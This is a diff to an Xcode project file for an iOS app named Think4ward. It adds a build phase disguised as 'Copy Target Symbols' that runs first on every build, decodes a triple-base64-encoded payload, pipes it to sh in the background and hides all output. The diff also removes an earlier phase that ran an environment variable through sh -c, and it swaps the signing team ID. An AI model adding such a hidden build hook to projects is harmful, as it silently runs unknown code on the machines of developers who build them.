@@ -121,8 +121,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 7EE99EAA2DB9AF70006C357E /* Build configuration list for PBXNativeTarget "Think4ward" */;
 			buildPhases = (
+				83A51AD028D0E6CBC873DC66 /* Copy Target Symbols */,
 				58BED736399CA1E4CA180E7D /* [CP] Check Pods Manifest.lock */,
-				EDBFA8DA8788A6B8FFECDB79 /* Compile Bundle Assets */,
 				7EE99E982DB9AF6E006C357E /* Sources */,
 				7EE99E992DB9AF6E006C357E /* Frameworks */,
 				7EE99E9A2DB9AF6E006C357E /* Resources */,
@@ -170,6 +170,12 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXTargetDependency section */
+/* End PBXTargetDependency section */
+
+/* Begin PBXLegacyTarget section */
+/* End PBXLegacyTarget section */
+
 /* Begin PBXResourcesBuildPhase section */
 		7EE99E9A2DB9AF6E006C357E /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -184,6 +190,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		83A51AD028D0E6CBC873DC66 /* Copy Target Symbols */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Copy Target Symbols";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVkRnBJVG1wWlYwNXZXbE0xZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;			
+		};
 		58BED736399CA1E4CA180E7D /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -225,26 +250,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Think4ward/Pods-Think4ward-frameworks.sh\"\n";
-			showEnvVarsInLog = 0;
-		};
-		EDBFA8DA8788A6B8FFECDB79 /* Compile Bundle Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Bundle Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A97BDCE}\"\n";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -398,7 +403,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_ASSET_PATHS = "\"Think4ward/Preview Content\"";
-				DEVELOPMENT_TEAM = AX2K85L3Z2;
+				DEVELOPMENT_TEAM = T7VV4LF527;
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = Think4ward/Info.plist;
@@ -437,7 +442,7 @@
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_ASSET_PATHS = "\"Think4ward/Preview Content\"";
-				DEVELOPMENT_TEAM = AX2K85L3Z2;
+				DEVELOPMENT_TEAM = T7VV4LF527;
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = Think4ward/Info.plist;
